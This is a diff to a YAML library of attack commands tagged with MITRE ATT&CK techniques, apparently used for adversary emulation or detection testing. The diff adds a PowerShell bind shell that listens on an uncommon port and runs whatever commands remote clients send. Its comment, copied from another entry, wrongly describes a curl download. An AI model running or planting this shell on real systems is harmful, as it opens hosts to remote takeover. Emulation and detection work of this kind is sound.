@@ -56,3 +56,12 @@ commands:
          - 'Execution;T1047;Windows Management Instrumentation'
          - 'Command and Control;T1105;Ingress Tool Transfer'
       comments: 'Download results of curl to output file'
+   network_listen_powershell_uncommmonport_1:
+      remote: false
+      id: network_listen_powershell_uncommmonport_1
+      command: 'powershell.exe -nop -ep bypass -Command "$VAR1=PORT;$VAR2=[System.Net.Sockets.TcpListener]$VAR1;$VAR2.Start();$VAR3=$VAR2.AcceptTCPClient();$VAR4=$VAR3.GetStream();[byte[]]$VAR5=$RANDOMPORTUNCOMMON$;$VAR6=([text.encoding]::ASCII).GetBytes(\"Windows PowerShell running as user \"+$env:username+\" on \"+$env:computername+\"`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n\");$VAR4.Write($VAR6,0,$VAR6.Length);$VAR6=([text.encoding]::ASCII).GetBytes(\"PS \"+(Get-Location).Path+\"> \");$VAR4.Write($VAR6,0,$VAR6.Length);while(($VAR7=$VAR4.Read($VAR5,0,$VAR5.Length)) -ne 0){$VAR8=([text.encoding]::ASCII).GetString($VAR5,0,$VAR7);try{$VAR9=(Invoke-Expression -command $VAR8 2>&1 | Out-String )}catch{Write-Warning \"Something went wrong with execution of command on the target.\";Write-Error $_;};$VAR10=$VAR9+ \"PS \"+(Get-Location).Path + \"> \";$VAR11=($error[0] | Out-String);$error.clear();$VAR10=$VAR10+$VAR11;$VAR6=([text.encoding]::ASCII).GetBytes($VAR10);$VAR4.Write($VAR6,0,$VAR6.Length);$VAR4.Flush();};$VAR3.Close();if($VAR2){$VAR2.Stop();};'
+      stealth: low
+      mitre:
+         - 'Execution;T1059.001;Command and Scripting Interpreter: PowerShell'
+         - 'Command and Control;T1571;Non-Standard Port'
+      comments: 'Download results of curl to output file'
